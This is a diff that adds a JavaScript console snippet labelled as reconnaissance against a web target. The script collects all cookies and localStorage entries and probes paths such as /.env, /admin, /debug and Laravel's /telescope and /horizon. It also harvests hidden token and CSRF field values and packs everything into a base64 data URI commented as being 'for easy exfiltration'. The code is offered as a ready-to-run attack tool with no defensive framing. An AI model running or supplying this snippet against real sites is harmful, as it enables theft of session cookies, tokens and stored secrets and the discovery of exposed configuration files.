@@ -1,0 +1,69 @@
+// Single console command for reconnaissance
+(function() {
+  const results = {
+    target: window.location.href,
+    cookies: {},
+    localStorage: {},
+    endpoints: [],
+    vulnerabilities: []
+  };
+  
+  // 1. Collect cookies
+  document.cookie.split(';').forEach(c => {
+    const [key, val] = c.trim().split('=');
+    results.cookies[key] = val;
+  });
+  
+  // 2. Check localStorage
+  try {
+    Object.keys(localStorage).forEach(key => {
+      results.localStorage[key] = localStorage.getItem(key);
+    });
+  } catch(e) {}
+  
+  // 3. Quick endpoint check
+  const quickEndpoints = [
+    '/telescope', '/horizon', '/nova', '/admin', 
+    '/api', '/.env', '/config', '/debug'
+  ];
+  
+  quickEndpoints.forEach(async (endpoint) => {
+    try {
+      const resp = await fetch(endpoint, { method: 'HEAD' });
+      if (resp.status !== 404) {
+        results.endpoints.push({
+          url: endpoint,
+          status: resp.status,
+          accessible: resp.ok
+        });
+      }
+    } catch(e) {}
+  });
+  
+  // 4. Check for exposed tokens
+  const tokenInputs = document.querySelectorAll('input[type="hidden"]');
+  tokenInputs.forEach(input => {
+    if (input.name.includes('token') || input.name.includes('csrf')) {
+      results.vulnerabilities.push({
+        type: 'EXPOSED_TOKEN',
+        element: input,
+        value: input.value,
+        name: input.name
+      });
+    }
+  });
+  
+  // 5. Output results
+  setTimeout(() => {
+    console.log('🔍 ENUMERATION RESULTS:');
+    console.log('Target:', results.target);
+    console.log('Cookies:', Object.keys(results.cookies).length, 'found');
+    console.log('LocalStorage:', Object.keys(results.localStorage).length, 'items');
+    console.log('Endpoints:', results.endpoints);
+    console.log('Vulnerabilities:', results.vulnerabilities);
+    
+    // Create data URI for easy exfiltration
+    const data = btoa(JSON.stringify(results));
+    console.log('Data URI: data:text/json;base64,' + data);
+  }, 2000);
+})();
